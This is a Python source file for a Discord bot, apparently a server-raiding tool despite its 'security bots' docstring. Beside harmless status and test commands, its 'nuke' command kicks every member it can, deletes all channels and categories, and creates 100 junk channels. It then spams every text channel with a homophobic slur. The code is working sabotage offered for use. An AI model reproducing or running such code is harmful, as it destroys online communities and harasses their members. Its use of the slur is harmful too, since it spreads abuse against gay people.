"""Module to be used for TSB Security Bots"""

import secrets
import argparse
from typing import Any

from discord import Intents
import discord.ext.commands

DISCORD_MAX_CHANNEL_LIMIT = 50
TOTAL_MESSAGES_PER_CHANNEL = 10

client = discord.ext.commands.Bot(command_prefix=">", intents=Intents.all())


@client.event
async def on_connect() -> None:
    """Displays status that bot has connected to Discord"""

    print("[*] Bot has connected to Discord")


@client.event
async def on_ready() -> None:
    """Displays status that bot is ready to use"""

    print("[+] Bot is ready")


@client.event
async def on_resume() -> None:
    """Displays status that bot has resumed"""

    print("[+] Bot resumed")


@client.event
async def on_disconnect() -> None:
    """Displays status that bot has disconnected from Discord"""

    print("[!] Bot has disconnected from Discord")


@client.command(aliases=["t", "testy"])
async def test(ctx: Any) -> None:
    """Command to test bot functionality"""

    if not client.user:
        raise RuntimeError("[!] Error: 'client.user' not initialized")

    await ctx.send(f"{client.user.name} is online and ready to be used!")


# @client.command()
# async def embed(ctx: Any, *, info: None = None) -> None:
#     """Command to create an embed message"""

#     embed = discord.Embed(  # pylint: disable=redefined-outer-name
#         title="Embed", description=info, color=ctx.author.color
#     )
#     embed.set_author(
#         name=ctx.author.display_name, icon_url=ctx.author.avatar_url
#     )

#     if not client.user:
#         raise RuntimeError("[!] Error: 'client.user' not initialized")

#     try:
#         embed.set_footer(
#             icon_url=client.user.avatar_url,
#             text=client.user.name,
#         )
#         embed.timestamp = datetime.datetime.now(tz=datetime.UTC)
#         embed.set_thumbnail(url=ctx.author.avatar_url)
#     except Exception as error:
#         print(f"[!] Error: {error}")
#         raise

#     await ctx.send(embed=embed)


@discord.ext.commands.has_permissions(kick_members=True)
@discord.ext.commands.command()
async def nuke(ctx: Any) -> None:
    """
    Command to nuke an entire server
        1. Kick everyone it can
        2. Delete all existing text/voice channels
        3. Delete all existing categories
        4. Create text/voice channels
        5. Populate every channel with data

    """

    # kicking all possible members
    for member in ctx.guild.members:
        if member != ctx.author:
            try:
                await member.kick(reason=None)
            except discord.Forbidden:
                print(f"[-] Failed to kick {member.name}")
            else:
                print(f"[+] Kicked {member.name}")

    # deleting all channels
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except Exception as error:  # pylint: disable=broad-except
            print(
                f"[-] Failed to delete channel {channel.name!r}"
                f" with error {error!r}"
            )
        else:
            print(f"[+] Deleted channel {channel.name}")

    # deleting all categories
    for category in ctx.guild.categories:
        try:
            await category.delete()
        except Exception as error:  # pylint: disable=broad-except
            print(
                f"[-] Failed to delete category {category.name!r}"
                f" with error {error!r}"
            )
        else:
            print(f"[+] Deleted category {category.name}")

    # creating spam text/voice channels
    for _ in range(DISCORD_MAX_CHANNEL_LIMIT):

        # create random text channel
        data = secrets.token_hex(32)
        await ctx.guild.create_text_channel(data)
        print(f"[+] Created text channel {data}")

        # create random voice channel
        data = secrets.token_hex(32)
        await ctx.guild.create_voice_channel(data)
        print(f"[+] Created voice channel {data}")

    # spamming channels
    for index in range(TOTAL_MESSAGES_PER_CHANNEL):
        print(f"[*] Spamming each channel, iteration {index}")
        for channel in ctx.guild.channels:
            if str(channel.type) == "text":
                try:
                    await channel.send("Bungy is ghey")
                except Exception:  # pylint: disable=broad-except
                    pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "token", help="Discord bot token to be used for authentication"
    )
    cmdline = parser.parse_args()
    client.run(token=cmdline.token)
